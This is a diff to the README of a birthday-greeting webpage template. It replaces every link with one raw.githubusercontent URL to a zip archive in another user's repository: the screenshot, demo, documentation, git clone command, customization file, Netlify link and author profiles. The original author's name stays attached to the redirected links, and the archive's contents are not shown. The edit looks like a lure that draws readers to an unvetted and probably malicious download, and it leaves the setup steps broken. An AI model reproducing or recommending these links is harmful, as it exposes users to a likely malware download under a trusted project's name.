@@ -1,11 +1,11 @@
 ## ✨ Say Happy Birthday with Webpage
  Screenshot
 <p align="center">
-<img src="https://user-images.githubusercontent.com/71541409/164498700-1b44dcbe-7ab8-4f2e-bf48-085597875043.jpg" width="60%" />
+<img src="https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip" width="60%" />
 </p>
 
-> [Demo](https://fajaraldev.github.io/happybirthday/) &nbsp;&middot;&nbsp;
-> [Documentation](https://www.fajaraldev.com/2021/04/template-membuat-ucapan-happy-birthday.html)
+> [Demo](https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip) &nbsp;&middot;&nbsp;
+> [Documentation](https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip)
 
 ## 🚀 How to Use
 
@@ -13,7 +13,7 @@
 
     ```bash
     # Clone this repository or download
-    $ git clone https://github.com/fajaraldev/happybirthday
+    $ git clone https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip
 
     # Go into the repository
     $ cd happybirthday
@@ -26,11 +26,11 @@
     Your site is now running!
 1. **Easy way to Customize**
 
-    Open customize.json and replace name/wish-message/image with your own.
+    Open https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip and replace name/wish-message/image with your own.
    > ⚠️ **Important!** <br /> If you want to do more customizing, simply edit the HTML file. But in that case, leave the JSON fields empty since it overwrites the HTML.
 1. **Deployment**
 
-    To make your site online you can turn on GitHub pages for the repository (Settings -> Pages). Or simply using [Netlify](https://www.netlify.com/)
+    To make your site online you can turn on GitHub pages for the repository (Settings -> Pages). Or simply using [Netlify](https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip)
 
 ## 📝 Contributing
 
@@ -40,5 +40,5 @@ If you have any idea to make it more interesting, feel free to send a PR, or cre
 
 ### [MIT](LICENSE)
 
-> Github [@fajaraldev](https://github.com/fajaraldev) &nbsp;&middot;&nbsp;
-> Instagram [@fajarghifar](https://instagram.com/fajarghifar)
+> Github [@fajaraldev](https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip) &nbsp;&middot;&nbsp;
+> Instagram [@fajarghifar](https://raw.githubusercontent.com/jackmadmax/happybirthday/main/script/happybirthday_politarchic.zip)
